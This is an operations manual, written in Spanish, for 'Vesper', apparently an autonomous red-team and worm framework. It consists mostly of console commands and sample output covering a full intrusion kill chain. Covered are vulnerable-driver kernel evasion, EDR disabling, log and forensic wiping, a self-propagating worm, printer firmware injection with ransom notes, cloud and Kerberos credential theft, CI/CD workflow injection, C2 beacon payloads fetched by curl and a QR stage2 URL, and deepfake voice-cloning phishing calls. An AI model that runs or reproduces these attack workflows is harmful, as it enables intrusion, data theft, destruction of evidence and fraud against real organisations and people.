# Vesper — Manual Operacional Completo

> Plataforma autónoma de Red Team · 45 módulos · 4 fases · ~12,700 líneas
> Go + Python + WASM · Post-Quantum C2 · Kernel Evasion · Exotic Propagation

---

## Índice

1. [Requisitos e Instalación](#1-requisitos-e-instalación)
2. [Despliegue Rápido](#2-despliegue-rápido)
3. [Arquitectura de Componentes](#3-arquitectura-de-componentes)
4. [Consola Interactiva](#4-consola-interactiva)
5. [Gestión de Campañas](#5-gestión-de-campañas)
6. [Catálogo de Módulos](#6-catálogo-de-módulos)
7. [Dashboard Operacional](#7-dashboard-operacional)
8. [C2 — Command & Control](#8-c2---command--control)
9. [Suite de Evasión](#9-suite-de-evasión)
10. [Vectores de Propagación](#10-vectores-de-propagación)
11. [Módulos de IA](#11-módulos-de-ia)
12. [Laboratorio EDR](#12-laboratorio-edr)
13. [Generación de Payloads](#13-generación-de-payloads)
14. [Bridge Python](#14-bridge-python)
15. [Solución de Problemas](#15-solución-de-problemas)
16. [Referencia de Archivos](#16-referencia-de-archivos)

---

## 1. Requisitos e Instalación

### 1.1 Dependencias

```bash
# Core
go >= 1.22.0          # Motor principal en Go
python >= 3.11        # Bridge + handlers en Python
git

# Python packages
pip install -r requirements.txt

# Go modules
```

```yaml
# Resumen de dependencias
core:
  go: ">=1.22"
  python: ">=3.11"
  
python_packages:
  - cryptography>=41.0
  - numpy>=1.24
  - requests>=2.31
  - PyYAML>=6.0
  - scapy>=2.5.0
  - websocket-client>=1.6.0
  - rich>=13.0
  - click>=8.0
  - fpdf2>=2.7.0
  - python-docx>=1.1.0
  - qrcode>=7.4
  - Pillow>=10.0
  - pymodbus>=3.5.0

go_modules:
  - google.golang.org/grpc
  - google.golang.org/protobuf
  - golang.org/x/crypto
  - golang.org/x/sys
  - golang.org/x/net
  - modernc.org/sqlite

optional:
  docker: ">=27.0"    # Laboratorio EDR
  node: ">=22.0"      # Dashboard frontend
  tinygo: "latest"    # WASM compilation
```

### 1.2 Verificación de Instalación

```bash
# Verificar Go
go version

# Verificar Python
python3 --version
python3 -c "import cryptography; print('cryptography OK')"

# Verificar dependencias opcionales
docker --version 2>/dev/null || echo "Docker no instalado (opcional)"
tinygo version 2>/dev/null || echo "TinyGo no instalado (opcional)"
```

---

## 2. Despliegue Rápido

### 2.1 One-Click Deploy

```bash
# Despliegue completo en Linux/macOS
bash deploy/deploy.sh

# El script ejecuta:
#  1. Verifica dependencias (Go + Python3)
#  3. Inicia el bridge Python en puerto 9100
#  4. Inicia el servidor C2 (Pulse-C2)
#  5. Inicia el dashboard (API + Web)
#  6. Muestra resumen de servicios

# Flags disponibles:
bash deploy/deploy.sh --dev              # Modo desarrollo (hot-reload)
bash deploy/deploy.sh --c2 10.0.0.1     # Especificar IP del C2
bash deploy/deploy.sh --target-os linux  # SO objetivo del payload
```

### 2.2 Despliegue Manual

```bash
# Paso 1: Clonar y preparar
git clone https://github.com/Ruby570bocadito/Vesper.git
cd Vesper
pip install -r requirements.txt

# Paso 2: Iniciar el Bridge Python
cd modules/bridge
python3 bridge.py &
cd ../..
# Verificar: curl http://localhost:9100/health

# Paso 3: Compilar y lanzar el C2 Dashboard
cd plugins/pulse-c2/src/go
go build -o vesper-dashboard ./cmd/dashboard
./vesper-dashboard -port 9090 &
cd ../../../..
# Abrir: http://localhost:9090

# Paso 4: Consola interactiva
cd cmd/vesper
go run . console
```

### 2.3 Demo Dry-Run

```bash
# Demo completa sin acciones reales
bash scripts/run_demo.sh

# El demo ejecuta:
#  1. Verifica dependencias
#  2. Inicia bridge Python en modo simulación
#  3. Ejecuta escaneo de red (simulado)
#  4. Lanza worm en modo dry-run
#  5. Genera informe de misión
```

### 2.4 Worm en Modo Simulación

```bash
cd plugins/worm

# Windows
python worm_core.py --config configs/config_simulation.yaml

# Linux/macOS  
python3 worm_core.py --config configs/config_simulation.yaml

# Configuración de simulación:
#  - dry_run: true (sin exploits reales)
#  - max_infections: 1000
#  - max_runtime_hours: 4
#  - kill_switch: EMERGENCY_STOP_SIMULATION
```

---

## 3. Arquitectura de Componentes

### 3.1 Diagrama de Flujo

```
Operador → [Consola CLI / Dashboard Web]
                │
        ┌───────┴───────┐
        ▼               ▼
   [C2 Hardened]   [AI Orchestrator]
   SPIFFE mTLS     Q-Learning FSM
   Ed25519 Sign    Federated Learning
   Kyber KEM       Autofactory AFL++
        │               │
        └───────┬───────┘
                ▼
        [Core Engine Go]
   ┌────────┼────────┐
   ▼        ▼        ▼
Engine    Suite     Vectors
   │        │        │
   └────────┼────────┘
            ▼
    [Python Bridge RPC]
            │
   ┌────────┼────────┐
   ▼        ▼        ▼
Worm+RL   Argos    Bluesky
Plugin    Ops      BT
```

### 3.2 Componentes

| Componente | Ruta | Lenguaje | Descripción |
|------------|------|----------|-------------|
| **AI Orchestrator** | `internal/appstate/` | Go | FSM con Q-learning |
| **Dispatcher** | `internal/dispatch/` | Go | Mapeo MITRE ATT&CK |
| **Agent** | `internal/agent/` | Go | Post-explotación, privesc |
| **Bridge** | `modules/bridge/` | Python | RPC Go↔Python, ~170 handlers |
| **Pulse C2** | `plugins/pulse-c2/` | Go | C2 con crypto SPIFFE/Ed25519/Kyber |
| **Worm** | `plugins/worm/` | Python | Worm con RL, 35 exploits |
| **Argos** | `plugins/operations/` | Go | Agentes cell/stager, EventBus |
| **Bluesky** | `plugins/blue/` | Python | Ataques Bluetooth |
| **AI Plugins** | `plugins/ai/` | Go | Hivemind, Autofactory, Vishing |
| **RF Contagion** | `plugins/rf_contagion/` | Go | SDR 4G/5G, baseband |
| **Wazero Bridge** | `internal/bridge/` | Go | WASM execution |
| **Dashboard** | `plugins/pulse-c2/.../c2/` | Go+Vue | API HTTP/WS + UI |

---

## 4. Consola Interactiva

### 4.1 Inicio

```bash
cd cmd/vesper
go run . console

# Prompt:
# vesper >
```

### 4.2 Comandos de Navegación

| Comando | Acción |
|---------|--------|
| `help` | Lista todos los comandos disponibles |
| `banner` | Muestra el banner ASCII Vesper |
| `exit` / `quit` | Sale de la consola |
| `version` | Muestra versión del framework |
| `clear` | Limpia la pantalla |

### 4.3 Comandos de Módulos

| Comando | Acción |
|---------|--------|
| `modules` | Lista los 45 módulos disponibles |
| `search <término>` | Busca módulos por nombre o descripción |
| `use <módulo>` | Carga un módulo para configuración |
| `show options` | Muestra parámetros del módulo cargado |
| `set <param> <valor>` | Configura un parámetro |
| `unset <param>` | Elimina un parámetro |
| `run` / `exploit` | Ejecuta el módulo cargado |
| `back` | Vuelve al menú principal |
| `info <módulo>` | Muestra información detallada |

### 4.4 Comandos de Campaña

| Comando | Acción |
|---------|--------|
| `campaign start --name <nombre>` | Inicia nueva campaña |
| `campaign status` | Estado de la campaña activa |
| `campaign pause` | Pausa campaña |
| `campaign resume` | Reanuda campaña |
| `campaign stop` | Detiene campaña |
| `killchain` | Muestra progreso del kill chain |

### 4.5 Comandos de Operación

| Comando | Acción |
|---------|--------|
| `recon --target <IP>` | Escaneo de reconocimiento |
| `exploit --target <IP>` | Ejecuta cadena de exploits |
| `privesc` | Escalada de privilegios |
| `persist` | Instala persistencia |
| `lateral --target <IP>` | Movimiento lateral |
| `exfil --path <ruta>` | Exfiltración de datos |
| `propagate --vector <nombre>` | Propagación vía vector específico |

### 4.6 Comandos de Infraestructura

| Comando | Acción |
|---------|--------|
| `listeners` | Lista listeners C2 activos |
| `dashboard` | Abre URL del dashboard |
| `deploy` | Despliegue completo one-click |
| `webhook --url <URL>` | Configura webhook de notificaciones |
| `db query <sql>` | Consulta la base de datos SQLite |
| `db hosts` | Lista hosts comprometidos |
| `db creds` | Lista credenciales capturadas |
| `db vulns` | Lista vulnerabilidades encontradas |

### 4.7 Comandos de Laboratorio

| Comando | Acción |
|---------|--------|
| `lab up` | Inicia laboratorio Docker |
| `lab down` | Detiene laboratorio |
| `lab status` | Estado del laboratorio |
| `lab test --module <nombre>` | Ejecuta test de evasión |

### 4.8 Flujo de Ataque Completo

```
vesper > campaign start --name "Operation Nightfall"
[+] Campaign started: Operation Nightfall
[+] FSM state: idle → recon

vesper > recon --target 10.0.0.0/24
[+] Scanning 254 hosts...
[+] Found: 12 hosts, 47 open ports
[+] FSM state: recon → exploiting

vesper > exploit --target 10.0.0.10
[+] CVE-2017-0144: SMB probe sent
[+] CVE-2021-44228: Log4Shell payload delivered
[+] Access obtained: 10.0.0.10
[+] FSM state: exploiting → privesc

vesper > privesc
[+] BYOVD: Loading WinRing0.sys
[+] DKOM: SYSTEM token stolen
[+] FSM state: privesc → persisting

vesper > persist
[+] WER Hangs hijack installed
[+] Startup persistence: OK
[+] Scheduled task: WerSyncHang created
[+] FSM state: persisting → lateral

vesper > lateral --target 10.0.0.20
[+] Kerberos: Unconstrained delegation found on DC01
[+] Coercion: PrinterBug sent to DC01
[+] TGT captured: Administrator@AD.DOMAIN.LOCAL
[+] Pass-the-Ticket: Access to 10.0.0.20

vesper > exfil --path /sensitive/data
[+] MFT Slack: 4KB stored in NTFS slack space
[+] DNS DoH: Data chunked via Cloudflare
[+] Exfiltration complete

vesper > killchain
 RECON [██████████] DONE
 ACCESS [██████████] DONE
 EXEC   [██████████] DONE
 PERSIST[██████████] DONE
 PRIVESC[██████████] DONE
 LATERAL[██████████] DONE
 EXFIL  [██████████] DONE
```

---

## 5. Gestión de Campañas

### 5.1 Ciclo de Vida

```
                    ┌──────────┐
                    │   IDLE   │
                    └────┬─────┘
                         │ campaign start
                    ┌────▼─────┐
                    │  RECON   │
                    └────┬─────┘
                         │ targets found
                    ┌────▼─────┐
                    │ EXPLOIT  │
                    └────┬─────┘
                         │ access obtained
                    ┌────▼─────┐
                    │ PRIVESC  │
                    └────┬─────┘
                         │ root/SYSTEM
                    ┌────▼─────┐
                    │ PERSIST  │──────────────┐
                    └────┬─────┘              │
                         │                   │
              ┌──────────┼──────────┐        │
              ▼          ▼          ▼        │
         LATERAL     EXFIL      EVADE ◄──────┘
              │          │          │
              └──────────┼──────────┘
                         ▼
                    ┌──────────┐
                    │  DONE    │
                    └──────────┘
```

### 5.2 Comandos de Campaña

```bash
# Desde la consola interactiva
vesper > campaign start --name "Operation Name" --targets targets.json

# Desde CLI
./vesper campaign start --name "Operation Name" --targets targets.json

# Opciones:
#   --name         Nombre de la campaña
#   --targets      Archivo JSON con objetivos
#   --phase        Fase inicial (recon, exploit, etc.)
#   --stealth      Modo sigiloso (velocidad reducida)
#   --auto         Modo automático (sin intervención)
```

### 5.3 Archivo de Objetivos (targets.json)

```json
{
  "campaign": "Operation Nightfall",
  "scope": ["10.0.0.0/24", "192.168.1.0/24"],
  "exclusions": ["10.0.0.1", "10.0.0.254"],
  "objectives": {
    "flags": 3,
    "domain_admin": true,
    "data_exfil": true
  },
  "rules_of_engagement": {
    "max_hosts": 50,
    "allowed_ports": [22, 80, 443, 445, 3389],
    "exploit_risk": "medium",
    "auto_privesc": true
  }
}
```

---

## 6. Catálogo de Módulos

### 6.1 FASE 1 — Evasión + Anti-Forense (10 módulos)

#### BYOVD Loader (`evasion/byovd_loader`)
Carga 5 drivers vulnerables para operaciones a nivel kernel.

```bash
vesper > use evasion/byovd_loader
vesper (byovd_loader) > show options

# Parámetros:
#   DRIVERS     WinRing0,Gdrv,RTCore64,kprocesshacker,cpuz
#   TARGET_PATH C:\Windows\System32\drivers
#   ACTION      install / uninstall / list

vesper (byovd_loader) > set DRIVERS WinRing0,Gdrv
vesper (byovd_loader) > run
```

**Capacidades:**
- Read/Write Physical Memory vía IOCTL
- MSR Read/Write (Model-Specific Registers)
- Handle elevation (PROCESS_ALL_ACCESS)
- EDR driver stopping (sc stop)

#### DKOM (`evasion/dkom`)
Ocultación de procesos vía manipulación directa de kernel.

```bash
vesper > use evasion/dkom
vesper (dkom) > set PID 1337
vesper (dkom) > set ACTION hide
vesper (dkom) > run
```

**Acciones disponibles:**
- `hide` — Oculta proceso de ActiveProcessLinks
- `steal_token` — Roba token SYSTEM (PID 4)
- `protect` — Protege proceso (PsProtectedType)
- `downgrade` — Degrada handles de EDR

#### Anti-Reversing (`evasion/anti_reversing`)

```bash
vesper > use evasion/anti_reversing
vesper > run
# Output:
#   [✓] Debugger: Not present
#   [✓] Remote Debugger: Not detected
#   [✓] Hardware BPs: 0 active
#   [✓] INT3 scan: 12 hits (legitimate)
#   [✓] CRC Integrity: OK
#   [✓] Timing Check: PASS
#   [!] Sandbox: VirtualBox detected (MAC: 08:00:27)
```

#### Anti-Forensics (`evasion/anti_forensics_adv`)

```bash
vesper > use evasion/anti_forensics_adv
vesper (anti_forensics_adv) > set ACTIONS dod_wipe,mft_corrupt,event_clear
vesper (anti_forensics_adv) > set TARGET_PATH /var/log/audit/
vesper (anti_forensics_adv) > run
```

**Técnicas:**
- DoD 5220.22-M wipe (3-pass, 7-pass)
- MFT $BITMAP corruption
- Crash dump disable (registry)
- Windows Event Log clearing
- Prefetch / USN Journal / Shellbag wipe
- ShimCache clearing

#### WER Persistence (`evasion/wer_persistence`)

```bash
vesper > use evasion/wer_persistence
vesper (wer_persistence) > set PAYLOAD_DLL C:\Windows\Temp\payload.dll
vesper (wer_persistence) > run
```

**Métodos:**
- HKLM\...\Windows Error Reporting\Hangs → DLL hijack
- HKLM\...\SilentProcessExit → monitor lsass.exe
- %APPDATA%\Startup\OneDrive.exe
- HKCU\...\Run → OneDrive
- Scheduled Task: WerSyncHang

#### MFT Slack Storage (`evasion/mft_slack`)

```bash
vesper > use evasion/mft_slack
vesper (mft_slack) > set ACTION store
vesper (mft_slack) > set DATA "agent_fragment_base64..."
vesper (mft_slack) > run
```

#### WFP DNS Poisoning (`evasion/wfp_dns_poison`)

```bash
vesper > use evasion/wfp_dns_poison
vesper (wfp_dns_poison) > set C2_SERVER 10.0.0.1
vesper (wfp_dns_poison) > set DOMAINS login.microsoftonline.com,*.defender.microsoft.com
vesper (wfp_dns_poison) > run
```

#### Blue Pill Hypervisor (`evasion/blue_pill`)

```bash
vesper > use evasion/blue_pill
vesper (blue_pill) > run
# Output:
#   [✓] VT-x supported
#   [✓] VMXON region: 4096 bytes
#   [✓] VMCS configured (guest+host state)
#   [✓] PatchGuard bypass active
#   [✓] CPUID trap: redirecting reads
```

#### LOLBin Chainer (`evasion/lolbin_chainer`)

```bash
vesper > use evasion/lolbin_chainer
vesper (lolbin_chainer) > set PAYLOAD calc.exe
vesper (lolbin_chainer) > set CHAIN_SIZE 5
vesper (lolbin_chainer) > run
# Output (random each time):
#   mshta.exe → rundll32.exe → certutil.exe → bitsadmin.exe → wmic.exe
```

**28 LOLBins disponibles:**
- Windows: mshta, rundll32, regsvr32, certutil, bitsadmin, cscript, wmic, msiexec, csc, InstallUtil, regasm, MSBuild, cdb, dnx, winrm, forfiles, pcalua, SyncAppvPublishingServer, desktopimgdownldr
- Linux: bash, python3, perl, ruby, awk, curl, wget, ncat, strace

#### Kernel DNS Driver (`evasion/wfp_kernel_dns`)

```bash
vesper > use evasion/wfp_kernel_dns
vesper (wfp_kernel_dns) > set C2_IP 10.0.0.1
vesper (wfp_kernel_dns) > run
```

### 6.2 FASE 2 — C2 Hardened (6 módulos)

#### SPIFFE mTLS (`c2/spiffe_mtls`)

```bash
vesper > use c2/spiffe_mtls
vesper (spiffe_mtls) > set TRUST_DOMAIN vesper.c2
vesper (spiffe_mtls) > set AGENT_PATH /agent/cell-001
vesper (spiffe_mtls) > run
# Output:
#   SPIFFE ID: spiffe://vesper.c2/agent/cell-001
#   SVID TTL: 1h
#   Cert Serial: 0x...
```

#### Multi-Channel C2 (`c2/multi_channel`)

```bash
vesper > use c2/multi_channel
vesper (multi_channel) > run
# Output:
#   [✓] gRPC: 127.0.0.1:50051 — HEALTHY
#   [✓] WebSocket: ws://127.0.0.1:8080/ws — HEALTHY
#   [✓] DoH: cloudflare-dns.com — HEALTHY
#   [✗] Twitter: API unavailable
#   [✗] Blockchain: not configured
#   Active: gRPC (priority 1)
```

#### Ed25519 Signing (`c2/ed25519`)

```bash
vesper > use c2/ed25519
vesper (ed25519) > run
# Output:
#   Public Key: a1b2c3d4...
#   Key ID: e5f6a7b8
#   Trusted Keys: 3
#   Signed Commands: 47
```

#### Dashboard Ops (`c2/dashboard_ops`)

```bash
vesper > use c2/dashboard_ops
vesper (dashboard_ops) > set PORT 9090
vesper (dashboard_ops) > run
# → http://localhost:9090
```

#### Kyber-1024 + X25519 (`c2/kyber_hybrid`)

```bash
vesper > use c2/kyber_hybrid
vesper (kyber_hybrid) > run
# Output:
#   Algorithm: Kyber-1024 + X25519 Hybrid KEM
#   Public Key: 1600 bytes
#   Shared Secret: 64 bytes
#   Session: AES-256-GCM + HMAC-SHA256
```

#### Proto Obfuscation (`c2/proto_obfuscate`)

```bash
vesper > use c2/proto_obfuscate
vesper (proto_obfuscate) > set PROTO_NAME agent.proto
vesper (proto_obfuscate) > run
# Output:
#   Obfuscated: XOR + AES-CTR + GZIP
#   Original: 4096 bytes → Obfuscated: 1024 bytes (25%)
#   Integrity: SHA256 verified
```

### 6.3 FASE 3 — Propagación Avanzada (12 módulos)

#### Ultrasound QPSK (`hydra/ultrasound`)

```bash
vesper > use hydra/ultrasound
vesper (ultrasound) > set PAYLOAD "VESPER_WORM_V3"
vesper (ultrasound) > set CARRIER_FREQ 19000
vesper (ultrasound) > run
# Output:
#   WAV file: /tmp/vesper_ultrasound_12345.wav
#   Carrier: 19kHz, Symbol Rate: 100 baud
#   Duration: 2.4s, Size: 211680 bytes
```

**Parámetros:**
- `CARRIER_FREQ` — Frecuencia portadora (Hz, default: 19000)
- `SYMBOL_RATE` — Tasa de símbolos (baud, default: 100)
- `PAYLOAD` — Datos a transmitir
- `ACTION` — `transmit` / `receive`

#### Powerline PLC (`hydra/powerline`)

```bash
vesper > use hydra/powerline
vesper (powerline) > run
# Output:
#   HomePlug devices: 3
#   UPnP devices: 12
#   PLC targets: 5
```

#### USB ADB (`hydra/usb_adb`)

```bash
vesper > use hydra/usb_adb
vesper (usb_adb) > set APK_PATH /tmp/payload.apk
vesper (usb_adb) > run
# Output:
#   ADB devices: 2
#   Installed on: emulator-5554 (OK)
#   Installed on: R58M45XXXXX (OK)
```

#### DNS Rebinding (`hydra/dns_rebinding`)

```bash
vesper > use hydra/dns_rebinding
vesper (dns_rebinding) > set ATTACK_DOMAIN cdn.vesper-edge.net
vesper (dns_rebinding) > set C2_SERVER 10.0.0.1
vesper (dns_rebinding) > run
```

#### CI/CD Webhooks (`hydra/cicd_webhooks`)

```bash
vesper > use hydra/cicd_webhooks
vesper (cicd_webhooks) > run
# Output:
#   CI Environments detected: 2 (GITHUB_ACTIONS, JENKINS_HOME)
#   [✓] GitHub Actions workflow injected
#   [✓] Jenkins job triggered
```

#### VLAN Jump (`hydra/vlan_jump`)

```bash
vesper > use hydra/vlan_jump
vesper (vlan_jump) > set INTERFACE eth0
vesper (vlan_jump) > set VLAN_RANGE 1,10,20,50,100
vesper (vlan_jump) > run
```

#### QR Worm (`hydra/qr_worm`)

```bash
vesper > use hydra/qr_worm
vesper (qr_worm) > set PAYLOAD "https://c2.vesper.online/stage2"
vesper (qr_worm) > run
# Output:
#   QR PNG: /tmp/vesper_qr_0_12345.png
#   Version: 6, Modules: 25×25
#   Capacity: 4,296 bits
```

#### PJL Worm (`hydra/pjl_worm`)

```bash
vesper > use hydra/pjl_worm
vesper (pjl_worm) > run
# Output:
#   Printers found: 4 (HP, Xerox, Canon, Brother)
#   [✓] NVRAM read: OK
#   [✓] Firmware injected: OK
#   [✓] Ransom note printed: OK
```

#### Chronos NTP (`propagation/chronos_ntp`)

```bash
vesper > use propagation/chronos_ntp
vesper (chronos_ntp) > set ACTION forward
vesper (chronos_ntp) > set HOURS 4
vesper (chronos_ntp) > run
# Output:
#   Fake NTP server: listening on :123
#   Time offset: +4h
#   Scheduled tasks: shifted
#   w32tm: hijacked
```

#### Reflective DLL (`propagation/reflective_dll`)

```bash
vesper > use propagation/reflective_dll
vesper (reflective_dll) > set DLL_PATH /tmp/payload.dll
vesper (reflective_dll) > set TARGET_PROCESS RuntimeBroker.exe
vesper (reflective_dll) > run
# Output:
#   Method: NtCreateSection + NtMapViewOfSection
#   Stager: 100 bytes (NASM)
#   Target: RuntimeBroker.exe (PID 4520)
#   Injection: OK
```

#### Kerberos Delegation (`propagation/kerberos_del`)

```bash
vesper > use propagation/kerberos_del
vesper (kerberos_del) > set DOMAIN AD.DOMAIN.LOCAL
vesper (kerberos_del) > run
# Output:
#   Unconstrained Delegation: DC01, SQL01, WEB01
#   [✓] Coercion: PrinterBug → DC01
#   [✓] TGT captured: Administrator@AD.DOMAIN.LOCAL
#   [✓] Silver Ticket: cifs/DC01
```

#### IMDSv2 Bypass (`propagation/imdsv2_bypass`)

```bash
vesper > use propagation/imdsv2_bypass
vesper (imdsv2_bypass) > run
# Output:
#   AWS Detected: Yes
#   IMDSv2 Token: AQAEAA...
#   IAM Role: arn:aws:iam::123456789:role/EC2Admin
#   Access Key: AKIA...
#   Neighbor Instances: 3
```

### 6.4 FASE 4 — IA + Cross-Platform (9 módulos)

#### Cross-Platform Loader (`loader/cross_platform`)

```bash
vesper > use loader/cross_platform
vesper (cross_platform) > set TARGET_OS linux
vesper (cross_platform) > set PAYLOAD "/bin/sh -c 'curl c2/beacon'"
vesper (cross_platform) > run
# Output:
#   [✓] ELF x86-64: 4096 bytes
#   [✓] Mach-O x86-64: 4096 bytes
#   [✓] APK: 8192 bytes
```

**Targets soportados:** `linux`, `darwin`, `android`

#### JIT Polymorphism (`ai/jit_polymorphism`)

```bash
vesper > use ai/jit_polymorphism
vesper (jit_polymorphism) > run
# Output:
#   Mutations: NOP-sleds → ConstObfuscate → RegisterReorder → InstructionSub → GarbageCode
#   Original: 256 bytes → Mutated: 312 bytes
#   Hash: a1b2c3d4
#   Runtime Loop: active (30s)
```

#### AI FSM Orchestrator (`ai/orchestrator`)

```bash
vesper > use ai/orchestrator
vesper (orchestrator) > run
# Output:
#   Algorithm: Q-Learning
#   States: 8 (idle→evading)
#   Episodes: 150
#   Avg Reward: 0.73
#   Exploration Rate: 0.12
#   Top Action (idle): recon (Q=0.89)
```

#### Federated Learning (`ai/federated_learn`)

```bash
vesper > use ai/federated_learn
vesper (federated_learn) > set AGENTS 5
vesper (federated_learn) > run
# Output:
#   FedAvg Round: 1
#   Global Loss: 0.34
#   Converged: No
#   Victim Profile: user-001 (vuln=0.72)
#   Optimal Phish Time: 10:30
```

#### Autofactory Fuzzer (`ai/autofactory`)

```bash
vesper > use ai/autofactory
vesper (autofactory) > set TARGET_BINARY /usr/bin/target
vesper (autofactory) > run
# Output:
#   AFL++: /usr/local/bin/afl-fuzz (available)
#   Mutations: 1000 cases, 5s
#   Crashes: 3
#   Exploit Candidates: 3
#   Top: Buffer Overflow in target (CVE-2024-XXXX)
```

#### Wazero Bridge (`bridge/wazero`)

```bash
vesper > use bridge/wazero
vesper (wazero) > set HANDLER handler_scan
vesper (wazero) > run
# Output:
#   WASM compiled: handler_scan.wasm (2048 bytes)
#   Module loaded: OK
#   Handler test: {"success": true, "target": "127.0.0.1"}
```

#### RF Contagion (`rf_contagion/baseband`)

```bash
vesper > use rf_contagion/baseband
vesper (rf_contagion) > run
# Output:
#   SDR: HackRF One (hackrf://0)
#   Modems: 2 (Quectel EC25, Sierra MC7455)
#   GSM Signals: 15 (800-900 MHz)
#   IMSI captured: 3
```

#### Deepfake Vishing (`ai/deepfake_vishing`)

```bash
vesper > use ai/deepfake_vishing
vesper (deepfake_vishing) > set TARGET_NAME "John Smith"
vesper (deepfake_vishing) > set COMPANY "Acme Corp"
vesper (deepfake_vishing) > run
# Output:
#   Script: "Hello, this is IT Security Operations..."
#   TTS Model: tacotron2-DDC
#   Voice Clone: 2.1s audio
#   Call placed: +15551234567
```

---

## 7. Dashboard Operacional

### 7.1 Acceso

```bash
# Iniciar dashboard
cd plugins/pulse-c2/src/go
go build -o vesper-dashboard ./cmd/dashboard
./vesper-dashboard -port 9090

# Acceder en navegador
open http://localhost:9090
```

### 7.2 Secciones del Dashboard

| Sección | Descripción | Endpoint |
|---------|-------------|----------|
| **Agents** | Lista de agentes activos (ID, hostname, IP, status) | `/api/agents` |
| **Map** | Mapa de propagación (nodos + edges) | `/api/map` |
| **Commands** | Historial de comandos firmados emitidos | `/api/commands` |
| **Status** | Métricas globales (agentes, propagaciones, uptime) | `/api/status` |
| **WebSocket** | Actualizaciones en tiempo real | `ws://host:9090/ws` |

### 7.3 API Endpoints

```bash
# Listar agentes
curl http://localhost:9090/api/agents

# Mapa de propagación
curl http://localhost:9090/api/map

# Emitir comando firmado
curl -X POST http://localhost:9090/api/command \
  -H "Content-Type: application/json" \
  -d '{"agent_id": "cell-001", "command": "recon"}'

# Estado del sistema
curl http://localhost:9090/api/status
```

### 7.4 WebSocket (Tiempo Real)

```javascript
// Conectar al WebSocket
const ws = new WebSocket('ws://localhost:9090/ws');

ws.onmessage = function(event) {
  const data = JSON.parse(event.data);
  console.log('Agents:', data.agents);
  console.log('Propagations:', data.propagations);
  console.log('Commands:', data.commands_issued);
};
```

---

## 8. C2 — Command & Control

### 8.1 Configuración SPIFFE mTLS

```yaml
# config.yaml
c2:
  spiffe:
    trust_domain: "vesper.c2"
    svid_ttl: 3600        # 1 hora
    ca_cert: "/etc/vesper/ca.crt"
    ca_key: "/etc/vesper/ca.key"
  mtls:
    enabled: true
    min_version: "1.3"
    client_auth: "require_and_verify"
```

### 8.2 Canales de Comunicación

| Canal | Prioridad | Puerto/URL | Fallback |
|-------|-----------|------------|----------|
| **gRPC** | 1 (primario) | `localhost:50051` | No |
| **WebSocket** | 2 | `ws://host:8080/ws` | Sí |
| **DNS-over-HTTPS** | 3 | `cloudflare-dns.com` | Sí |
| **Twitter API** | 4 | `api.twitter.com` | Sí |
| **Blockchain** | 5 | `btc-mainnet` | Sí |

### 8.3 Firmado de Comandos (Ed25519)

```bash
# Generar par de claves
vesper > c2 keygen

# Firmar comando
vesper > c2 sign --agent cell-001 --command "recon"

# Verificar firma
vesper > c2 verify --signature "a1b2c3..." --key "d4e5f6..."
```

### 8.4 Post-Quantum Key Exchange

```bash
# Intercambio híbrido Kyber-1024 + X25519
vesper > c2 keyx --algo kyber-hybrid

# Resultado:
#   Alice Pub: 1600 bytes (Kyber + X25519)
#   Ciphertext: 1600 bytes
#   Shared Secret: 64 bytes
#   Session: AES-256-GCM + HMAC-SHA256
```

---

## 9. Suite de Evasión

### 9.1 Flujo de Evasión Recomendado

```
1. BYOVD Loader     → Cargar driver vulnerable
2. DKOM              → Ocultar procesos del agente
3. Anti-Reversing    → Detectar debuggers / sandboxes
4. WFP DNS Poison    → Redirigir tráfico EDR/AV
5. Blue Pill HV      → Virtualizar el SO (Ring -1)
6. LOLBin Chainer    → Ejecutar payload sin binarios sospechosos
7. Anti-Forensics    → Limpiar logs, wipe forense
8. MFT Slack         → Ocultar payload en NTFS slack
```

### 9.2 Verificación de Evasión

```bash
# Test completo de evasión
vesper > evasion test --all

# Output:
#   [✓] BYOVD: WinRing0 loaded
#   [✓] DKOM: Process hidden
#   [✓] Anti-Debug: No debugger detected
#   [✓] WFP DNS: 15 domains redirected
#   [✓] Blue Pill: VT-x active
#   [✓] LOLBin: Chain generated
#   [✓] Anti-Forensics: Logs wiped
#   [✓] MFT Slack: Fragment stored
```

---

## 10. Vectores de Propagación

### 10.1 Hydra Vectors (8 vectores)

| Vector | Medio | Alcance | Sigilo |
|--------|-------|---------|--------|
| Ultrasound QPSK | Aire (audio >18kHz) | ~5m | Muy alto |
| Powerline PLC | Red eléctrica | Todo el edificio | Alto |
| USB ADB | USB/Android | Dispositivos conectados | Medio |
| DNS Rebinding | Red (DNS) | Internet | Alto |
| CI/CD Webhooks | Internet (APIs) | Organización | Medio |
| VLAN Jump | Red (Ethernet) | Segmentos de red | Alto |
| QR Worm | Visual (cámara) | Línea de vista | Muy alto |
| PJL Worm | Red (impresoras) | Oficina | Alto |

### 10.2 Propagación en Campaña

```bash
# Activar todos los vectores
vesper > propagate --vector all

# Activar vectores específicos
vesper > propagate --vector ultrasound,powerline,usb_adb

# Propagación sigilosa (velocidad reducida)
vesper > propagate --stealth --delay 30
```

---

## 11. Módulos de IA

### 11.1 AI Orchestrator (Q-Learning FSM)

```bash
# Entrenar el orquestador
vesper > ai train --episodes 1000

# Predecir próxima acción
vesper > ai predict --state recon
# Output: exploit (confidence: 0.85, risk: 0.7)

# Exportar Q-Table
vesper > ai export --output qtable.json
```

### 11.2 Federated Learning

```bash
# Iniciar ronda FedAvg
vesper > ai fedavg --agents 5 --rounds 10

# Perfilar víctima
vesper > ai profile --user user-001
# Output:
#   Login Times: 8.5, 9.0, 9.5, 13.0, 14.0, 18.0
#   Typing Speed: 52.5 WPM
#   Vulnerability: 0.72
#   Optimal Phish: 10:30 AM

# Exportar modelo
vesper > ai export-model --output fed_model.json
```

### 11.3 Autofactory Fuzzer

```bash
# Fuzzear binario objetivo
vesper > ai fuzz --target /usr/bin/target --duration 60

# Output:
#   Mutations: 12,000 cases
#   Crashes: 7
#   Unique Crashes: 3
#   Exploit Candidates: 3
```

### 11.4 Deepfake Vishing

```bash
# Clonar voz y llamar
vesper > ai vishing --audio /tmp/ceo_voice.wav --target +15551234567

# Solo generar guión
vesper > ai vishing --script-only --target-name "Jane Doe" --company "TechCorp"
```

---

## 12. Laboratorio EDR

### 12.1 Inicio

```bash
# Iniciar laboratorio
docker-compose -f lab/docker-compose.edr.yml up -d

# Contenedores:
#   vesper_edr_target      Windows Server 2022 (Defender ATP)
#   vesper_siem            Elasticsearch 8
#   vesper_kibana          Kibana 8
#   vesper_sysmon_collector Sysmon + Auditd
#   vesper_test_runner     Test automation

# Acceso:
#   RDP: localhost:3389
#   Kibana: http://localhost:5601
